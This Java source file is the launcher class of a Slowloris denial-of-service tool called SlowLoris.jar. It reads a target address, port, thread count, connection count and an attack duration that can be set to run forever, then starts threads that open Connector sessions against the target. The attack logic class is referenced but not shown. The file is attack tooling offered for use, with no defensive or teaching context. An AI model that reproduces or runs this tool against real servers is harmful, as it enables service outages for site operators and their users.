import java.net.MalformedURLException;
public class Main
{
    public static int connections = 0;
    public static void main(String[] args)
    {
        if(args.length != 5)
            die("Example usage:\n\t\tjava -jar SlowLoris.jar TARGET PORT NUMBER_OF_THREADS NUMBER_OF_CONNECTIONS TIMER\n\n\t\tTARGET: the address of the target\n\t\tPORT: the port on the target server to connect to\n\t\tNUMBER_OF_THREADS: how many threads the program should create. \n\t\tNUMBER_OF_CONNECTIONS: how many connections the program should create. \n\t\tTIMER: how long the attack should last in minutes. Use 0 for forever");

        int port = 0;
        int threads = 0;
        int timer = 0;
        try
        {
            port = Integer.parseInt(args[1]);
            threads = Integer.parseInt(args[2]);
            connections = Integer.parseInt(args[3]);
            timer = Integer.parseInt(args[4]);
        }
        catch(NumberFormatException nfe)
        {
            die(nfe.getMessage());
        }

        for(int i = 0; i < threads; i++)
        {
            try
            {
                Connector connector = new Connector(args[0], connections, port, timer);
                new Thread(connector).start();
            }
            catch(MalformedURLException mue)
            {
                die(mue.getMessage());
            }
        }
    }
    private static void die(String deathMsg)
    {
        System.err.println(deathMsg);
        System.exit(-1);
    }
}